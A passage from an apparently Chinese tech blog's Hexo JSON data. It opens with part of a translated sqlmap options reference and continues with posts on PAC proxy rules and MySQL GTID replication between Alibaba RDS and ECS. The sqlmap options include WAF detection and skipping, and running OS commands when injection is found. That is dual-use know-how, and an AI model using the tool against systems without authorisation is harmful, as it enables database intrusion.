<span class=\"keyword\">to</span> a configuration INI file</span><br><span class=\"line\"><span class=\"comment\">## 保存选项到INI配置文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--scope</span>=SCOPE Regexp <span class=\"keyword\">to</span><span class=\"built_in\"> filter </span>targets <span class=\"keyword\">from</span> provided<span class=\"built_in\"> proxy </span>log</span><br><span class=\"line\"><span class=\"comment\">## 使用正则表达式从提供的代理日志中过滤目标</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--test-filter</span>=TE.. Select tests by payloads <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> titles (e.g. ROW)</span><br><span class=\"line\"><span class=\"comment\">## 根据有效负载和/或标题(e.g. ROW)选择测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--test-skip</span>=TEST.. Skip tests by payloads <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> titles (e.g. BENCHMARK)</span><br><span class=\"line\"><span class=\"comment\">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--update Update sqlmap</span><br><span class=\"line\"><span class=\"comment\">## 更新SqlMap</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Miscellaneous（杂项）\"><a href=\"#Miscellaneous（杂项）\" class=\"headerlink\" title=\"Miscellaneous（杂项）\"></a>Miscellaneous（杂项）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Miscellaneous（杂项）:</span><br><span class=\"line\">​</span><br><span class=\"line\">-z MNEMONICS Use short mnemonics (e.g. <span class=\"string\">\"flu,bat,ban,tec=EU\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 使用简短的助记符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--alert</span>=ALERT <span class=\"builtin-name\">Run</span> host OS command(s) when SQL injection is found</span><br><span class=\"line\"><span class=\"comment\">## 在找到SQL注入时运行主机操作系统命令</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--answers</span>=ANSWERS <span class=\"builtin-name\">Set</span> question answers (e.g. <span class=\"string\">\"quit=N,follow=N\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 设置问题答案</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--beep Beep on question <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> when SQL injection is found</span><br><span class=\"line\"><span class=\"comment\">## 发现SQL 注入时提醒</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--cleanup Clean up the DBMS <span class=\"keyword\">from</span> sqlmap specific UDF <span class=\"keyword\">and</span> tables SqlMap</span><br><span class=\"line\"><span class=\"comment\">## 具体的UDF和表清理DBMS</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dependencies Check <span class=\"keyword\">for</span> missing (non-core) sqlmap dependencies</span><br><span class=\"line\"><span class=\"comment\">## 检查是否缺少（非内核）sqlmap依赖关系</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--disable-coloring <span class=\"builtin-name\">Disable</span><span class=\"built_in\"> console </span>output coloring</span><br><span class=\"line\"><span class=\"comment\">## 禁用控制台输出颜色</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--gpage</span>=GOOGLEPAGE Use Google dork results <span class=\"keyword\">from</span> specified<span class=\"built_in\"> page </span>number</span><br><span class=\"line\"><span class=\"comment\">## 使用Google dork结果指定页码</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--identify-waf Make a thorough testing <span class=\"keyword\">for</span> a WAF/IPS/IDS protection</span><br><span class=\"line\"><span class=\"comment\">## 对WAF / IPS / IDS保护进行全面测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class=\"line\"><span class=\"comment\">## 跳过启发式检测WAF / IPS / IDS保护</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class=\"line\"><span class=\"comment\">##  通过HTTP User-Agent标头模仿智能手机</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--offline Work <span class=\"keyword\">in</span> offline mode (only use session data)</span><br><span class=\"line\"><span class=\"comment\">## 在离线模式下工作（仅使用会话数据）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--page-rank Display<span class=\"built_in\"> page </span>rank (PR) <span class=\"keyword\">for</span> Google dork results</span><br><span class=\"line\"><span class=\"comment\">##  Google dork结果显示网页排名（PR）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--purge-output Safely <span class=\"builtin-name\">remove</span> all content <span class=\"keyword\">from</span> output directory</span><br><span class=\"line\"><span class=\"comment\">##  安全地从输出目录中删除所有内容</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--smart Conduct thorough tests only <span class=\"keyword\">if</span> positive heuristic(s)</span><br><span class=\"line\"><span class=\"comment\">## 只有在正启发式时才进行彻底测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--sqlmap-shell Prompt <span class=\"keyword\">for</span> an interactive sqlmap shell</span><br><span class=\"line\"><span class=\"comment\">## 提示交互式 sqlmap shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--wizard<span class=\"built_in\"> Simple </span>wizard<span class=\"built_in\"> interface </span><span class=\"keyword\">for</span> beginner users</span><br><span class=\"line\"><span class=\"comment\">## 给初级用户的简单向导界面</span></span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"PAC规则配置","abbrlink":57233,"_content":"\n### 前言\n\n访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置\n\n<!--more-->\n\n### 基本规则\n\n- 通配符支持，如 `*.example.com/*` 实际书写时可省略 如： `.example.com/` 意即 `.example.com/*`\n\n- 正则表达式支持，以 `\\` 开始和结束， 如： `\\[\\w]+:\\/\\/example.com\\`\n\n- 例外规则 `@@`，如 `@@*.example.com/*` 满足 `@@` 后规则的地址不使用代理\n\n- 匹配地址开始和结尾 `|`，如： `|http://example.com`、`example.com|` 分别表示以 `http://example.com` 开始和以 `example.com` 结束的地址\n\n- || 标记，如： `||example.com` 则 `http://example.com` 、`https://example.com` 、`ftp://example.com` 等地址均满足条件，只用于匹配地址开头\n\n- 注释 `!` 如： `! Comment`\n\n- 分隔符 `^`，表示除了字母、数字或者 `_ - . %` 之外的任何字符如： `http://example.com^` ，`http://example.com/` 和 `http://example.com:8000/` 均满足条件，而 `http://example.com.ar/` 不满足条件\n\n### 自定义规则\n\n```conf\n! Put user rules line by line in this file.\n\n! See https://adblockplus.org/en/filter-cheatsheet\n\n@@||localhost\n\n||github.com\n\n```\n\n一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问\n","source":"_posts/2020/2/PAC规则配置.md","raw":"---\nlayout: post\ntitle: PAC规则配置\ntags:\n  - ssr\ncategories:\n  - 科学上网\nabbrlink: 57233\n---\n\n### 前言\n\n访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置\n\n<!--more-->\n\n### 基本规则\n\n- 通配符支持，如 `*.example.com/*` 实际书写时可省略 如： `.example.com/` 意即 `.example.com/*`\n\n- 正则表达式支持，以 `\\` 开始和结束， 如： `\\[\\w]+:\\/\\/example.com\\`\n\n- 例外规则 `@@`，如 `@@*.example.com/*` 满足 `@@` 后规则的地址不使用代理\n\n- 匹配地址开始和结尾 `|`，如： `|http://example.com`、`example.com|` 分别表示以 `http://example.com` 开始和以 `example.com` 结束的地址\n\n- || 标记，如： `||example.com` 则 `http://example.com` 、`https://example.com` 、`ftp://example.com` 等地址均满足条件，只用于匹配地址开头\n\n- 注释 `!` 如： `! Comment`\n\n- 分隔符 `^`，表示除了字母、数字或者 `_ - . %` 之外的任何字符如： `http://example.com^` ，`http://example.com/` 和 `http://example.com:8000/` 均满足条件，而 `http://example.com.ar/` 不满足条件\n\n### 自定义规则\n\n```conf\n! Put user rules line by line in this file.\n\n! See https://adblockplus.org/en/filter-cheatsheet\n\n@@||localhost\n\n||github.com\n\n```\n\n一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问\n","slug":"2020/2/PAC规则配置","published":1,"date":"2020-02-16T08:11:48.644Z","updated":"2020-04-12T06:34:43.629Z","comments":1,"photos":[],"link":"","_id":"ck9z76w03002d44vq4gk21oxh","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置</p>\n<a id=\"more\"></a>\n<h3 id=\"基本规则\"><a href=\"#基本规则\" class=\"headerlink\" title=\"基本规则\"></a>基本规则</h3><ul>\n<li><p>通配符支持，如 <code>*.example.com/*</code> 实际书写时可省略 如： <code>.example.com/</code> 意即 <code>.example.com/*</code></p>\n</li>\n<li><p>正则表达式支持，以 <code>\\</code> 开始和结束， 如： <code>\\[\\w]+:\\/\\/example.com\\</code></p>\n</li>\n<li><p>例外规则 <code>@@</code>，如 <code>@@*.example.com/*</code> 满足 <code>@@</code> 后规则的地址不使用代理</p>\n</li>\n<li><p>匹配地址开始和结尾 <code>|</code>，如： <code>|http://example.com</code>、<code>example.com|</code> 分别表示以 <code>http://example.com</code> 开始和以 <code>example.com</code> 结束的地址</p>\n</li>\n<li><p>|| 标记，如： <code>||example.com</code> 则 <code>http://example.com</code> 、<code>https://example.com</code> 、<code>ftp://example.com</code> 等地址均满足条件，只用于匹配地址开头</p>\n</li>\n<li><p>注释 <code>!</code> 如： <code>! Comment</code></p>\n</li>\n<li><p>分隔符 <code>^</code>，表示除了字母、数字或者 <code>_ - . %</code> 之外的任何字符如： <code>http://example.com^</code> ，<code>http://example.com/</code> 和 <code>http://example.com:8000/</code> 均满足条件，而 <code>http://example.com.ar/</code> 不满足条件</p>\n</li>\n</ul>\n<h3 id=\"自定义规则\"><a href=\"#自定义规则\" class=\"headerlink\" title=\"自定义规则\"></a>自定义规则</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Put user rules line by line in this file.</span><br><span class=\"line\"></span><br><span class=\"line\">! See https://adblockplus.org/en/filter-cheatsheet</span><br><span class=\"line\"></span><br><span class=\"line\">@@||localhost</span><br><span class=\"line\"></span><br><span class=\"line\">||github.com</span><br></pre></td></tr></table></figure>\n<p>一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置</p>","more":"<h3 id=\"基本规则\"><a href=\"#基本规则\" class=\"headerlink\" title=\"基本规则\"></a>基本规则</h3><ul>\n<li><p>通配符支持，如 <code>*.example.com/*</code> 实际书写时可省略 如： <code>.example.com/</code> 意即 <code>.example.com/*</code></p>\n</li>\n<li><p>正则表达式支持，以 <code>\\</code> 开始和结束， 如： <code>\\[\\w]+:\\/\\/example.com\\</code></p>\n</li>\n<li><p>例外规则 <code>@@</code>，如 <code>@@*.example.com/*</code> 满足 <code>@@</code> 后规则的地址不使用代理</p>\n</li>\n<li><p>匹配地址开始和结尾 <code>|</code>，如： <code>|http://example.com</code>、<code>example.com|</code> 分别表示以 <code>http://example.com</code> 开始和以 <code>example.com</code> 结束的地址</p>\n</li>\n<li><p>|| 标记，如： <code>||example.com</code> 则 <code>http://example.com</code> 、<code>https://example.com</code> 、<code>ftp://example.com</code> 等地址均满足条件，只用于匹配地址开头</p>\n</li>\n<li><p>注释 <code>!</code> 如： <code>! Comment</code></p>\n</li>\n<li><p>分隔符 <code>^</code>，表示除了字母、数字或者 <code>_ - . %</code> 之外的任何字符如： <code>http://example.com^</code> ，<code>http://example.com/</code> 和 <code>http://example.com:8000/</code> 均满足条件，而 <code>http://example.com.ar/</code> 不满足条件</p>\n</li>\n</ul>\n<h3 id=\"自定义规则\"><a href=\"#自定义规则\" class=\"headerlink\" title=\"自定义规则\"></a>自定义规则</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">! Put user rules line by line in this file.</span><br><span class=\"line\"></span><br><span class=\"line\">! See https://adblockplus.org/en/filter-cheatsheet</span><br><span class=\"line\"></span><br><span class=\"line\">@@||localhost</span><br><span class=\"line\"></span><br><span class=\"line\">||github.com</span><br></pre></td></tr></table></figure>\n<p>一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问</p>"},{"layout":"post","title":"阿里云RDS与ECS服务器数据库做主从","abbrlink":13832,"_content":"\n### 前言\n\n实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：\n\n- mysql-bin正常情况下,RDS在本地只保存18个小时\n\n- 当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)\n\n考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步\n\n<!--more-->\n\n### 基础概念\n\n传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。\n\nGTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是`source_id:transaction_id`，如`3E11FA47-71CA-11E1-9E33-C80AA9429562:23`\n\n- source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里\n\n- transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识\n\n它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。\n\n也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了\n\n### RDS数据库配置\n\n- 配置从实例读取数据使用的只读账号和授权数据库\n- 将ECS的从实例的 IP 地址加入主实例的 IP 白名单中\n- 登录主实例\n\n#### 查询 server-id\n\n```mysql\nmysql> show variables like 'server_id';\n```\n\n#### 查询 GTID\n\n```mysql\nmysql> show global variables like 'gtid_purged';\n```\n\n### ECS数据库配置\n\n#### mysql文件配置\n\n```conf\nserver-id = 1001 #不可与RDS主库id相同\nport = 3306\nreplicate-do-db = masterdb #需要同步的数据库\n\nbinlog_format = row #日志文件格式\nlog-bin = mysql-bin\nlog-bin-index = mysql-bin.index\nrelay-log = relay-log\nrelay_log_index = relay-log.index\nslave-skip-errors = all\n```\n\n#### GTID配置\n\n```conf\ngtid_mode = on\nenforce_gtid_consistency = on\nlog-slave-updates = 1\n\nsql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES\n```\n\n#### 从库配置\n\n```mysql\nmysql> stop slave;\nmysql> set global gtid_purged = '533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396';\n```\n\n>注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令\n\n```mysql\nmysql>reset master;\n```\n\n#### 执行同步\n\n```mysql\nCHANGE MASTER TO\nMASTER_HOST='xxxxxxx.mysql.rds.aliyuncs.com',\nMASTER_PORT=3306,\nMASTER_USER='username',\nMASTER_PASSWORD='password',\nmaster_auto_position=1;\n\nmysql>start slave;\n```\n\n#### 查看从库状态\n\n```mysql\nmysql>show slave status\\G;\n```\n\n两个yes表示成功\n\n```mysql\n  Slave_IO_Running: Yes\n  Slave_SQL_Running: Yes\n```\n","source":"_posts/2020/2/阿里云RDS与ECS服务器数据库做主从.md","raw":"---\nlayout: post\ntitle: 阿里云RDS与ECS服务器数据库做主从\ntags:\n  - mysql\ncategories:\n  - mysql\nabbrlink: 13832\n---\n\n### 前言\n\n实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：\n\n- mysql-bin正常情况下,RDS在本地只保存18个小时\n\n- 当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)\n\n考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步\n\n<!--more-->\n\n### 基础概念\n\n传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。\n\nGTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是`source_id:transaction_id`，如`3E11FA47-71CA-11E1-9E33-C80AA9429562:23`\n\n- source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里\n\n- transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识\n\n它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。\n\n也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了\n\n### RDS数据库配置\n\n- 配置从实例读取数据使用的只读账号和授权数据库\n- 将ECS的从实例的 IP 地址加入主实例的 IP 白名单中\n- 登录主实例\n\n#### 查询 server-id\n\n```mysql\nmysql> show variables like 'server_id';\n```\n\n#### 查询 GTID\n\n```mysql\nmysql> show global variables like 'gtid_purged';\n```\n\n### ECS数据库配置\n\n#### mysql文件配置\n\n```conf\nserver-id = 1001 #不可与RDS主库id相同\nport = 3306\nreplicate-do-db = masterdb #需要同步的数据库\n\nbinlog_format = row #日志文件格式\nlog-bin = mysql-bin\nlog-bin-index = mysql-bin.index\nrelay-log = relay-log\nrelay_log_index = relay-log.index\nslave-skip-errors = all\n```\n\n#### GTID配置\n\n```conf\ngtid_mode = on\nenforce_gtid_consistency = on\nlog-slave-updates = 1\n\nsql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES\n```\n\n#### 从库配置\n\n```mysql\nmysql> stop slave;\nmysql> set global gtid_purged = '533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396';\n```\n\n>注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令\n\n```mysql\nmysql>reset master;\n```\n\n#### 执行同步\n\n```mysql\nCHANGE MASTER TO\nMASTER_HOST='xxxxxxx.mysql.rds.aliyuncs.com',\nMASTER_PORT=3306,\nMASTER_USER='username',\nMASTER_PASSWORD='password',\nmaster_auto_position=1;\n\nmysql>start slave;\n```\n\n#### 查看从库状态\n\n```mysql\nmysql>show slave status\\G;\n```\n\n两个yes表示成功\n\n```mysql\n  Slave_IO_Running: Yes\n  Slave_SQL_Running: Yes\n```\n","slug":"2020/2/阿里云RDS与ECS服务器数据库做主从","published":1,"date":"2020-02-14T16:29:06.620Z","updated":"2020-04-12T06:34:43.630Z","comments":1,"photos":[],"link":"","_id":"ck9z76w03002g44vqj2isbbm7","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个：</p>\n<ul>\n<li><p>mysql-bin正常情况下,RDS在本地只保存18个小时</p>\n</li>\n<li><p>当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除)</p>\n</li>\n</ul>\n<p>考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步</p>\n<a id=\"more\"></a>\n<h3 id=\"基础概念\"><a href=\"#基础概念\" class=\"headerlink\" title=\"基础概念\"></a>基础概念</h3><p>传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。</p>\n<p>GTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是<code>source_id:transaction_id</code>，如<code>3E11FA47-71CA-11E1-9E33-C80AA9429562:23</code></p>\n<ul>\n<li><p>source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里</p>\n</li>\n<li><p>transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识</p>\n</li>\n</ul>\n<p>它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。</p>\n<p>也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了</p>\n<h3 id=\"RDS数据库配置\"><a href=\"#RDS数据库配置\" class=\"headerlink\" title=\"RDS数据库配置\"></a>RDS数据库配置</h3><ul>\n<li>配置从实例读取数据使用的只读账号和授权数据库</li>\n<li>将ECS的从实例的 IP 地址加入主实例的 IP 白名单中</li>\n<li>登录主实例</li>\n</ul>\n<h4 id=\"查询-server-id\"><a href=\"#查询-server-id\" class=\"headerlink\" title=\"查询 server-id\"></a>查询 server-id</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &apos;server_id&apos;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"查询-GTID\"><a href=\"#查询-GTID\" class=\"headerlink\" title=\"查询 GTID\"></a>查询 GTID</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show global variables like &apos;gtid_purged&apos;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ECS数据库配置\"><a href=\"#ECS数据库配置\" class=\"headerlink\" title=\"ECS数据库配置\"></a>ECS数据库配置</h3><h4 id=\"mysql文件配置\"><a href=\"#mysql文件配置\" class=\"headerlink\" title=\"mysql文件配置\"></a>mysql文件配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server-id = 1001 #不可与RDS主库id相同</span><br><span class=\"line\">port = 3306</span><br><span class=\"line\">replicate-do-db = masterdb #需要同步的数据库</span><br><span class=\"line\"></span><br><span class=\"line\">binlog_format = row #日志文件格式</span><br><span class=\"line\">log-bin = mysql-bin</span><br><span class=\"line\">log-bin-index = mysql-bin.index</span><br><span class=\"line\">relay-log = relay-log</span><br><span class=\"line\">relay_log_index = relay-log.index</span><br><span class=\"line\">slave-skip-errors = all</span><br></pre></td></tr></table></figure>\n<h4 id=\"GTID配置\"><a href=\"#GTID配置\" class=\"headerlink\" title=\"GTID配置\"></a>GTID配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gtid_mode = on</span><br><span class=\"line\">enforce_gtid_consistency = on</span><br><span class=\"line\">log-slave-updates = 1</span><br><span class=\"line\"></span><br><span class=\"line\">sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br></pre></td></tr></table></figure>\n<h4 id=\"从库配置\"><a href=\"#从库配置\" class=\"headerlink\" title=\"从库配置\"></a>从库配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; stop slave;</span><br><span class=\"line\">mysql&gt; set global gtid_purged = &apos;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&apos;;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset  master命令</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt;reset master;</span><br></pre></td></tr></table></figure>\n<h4 id=\"执行同步\"><a href=\"#执行同步\" class=\"headerlink\" title=\"执行同步\"></a>执行同步</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHANGE MASTER TO</span><br><span class=\"line\">MASTER_HOST=&apos;xxxxxxx.mysql.rds.aliyuncs.com&apos;,</span><br><span class=\"line\">MASTER_PORT=3306,</span><br><span class=\"line\">MASTER_USER=&apos;username&apos;,</span><br><span class=\"line\">MASTER_PASSWORD=&apos;password&apos;,</span><br><span class=\"line\">master_auto_position=1;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt;start slave;</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看从库状态\"><a href=\"#查看从库状态\" class=\"headerlink\" title=\"查看从库状态\"></a>查看从库状态</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt;show slave status\\G;</span><br></pre></td></tr></table></figure>\n<p>两个yes表示成功</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Slave_IO_Running: Yes</span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>实现RDS 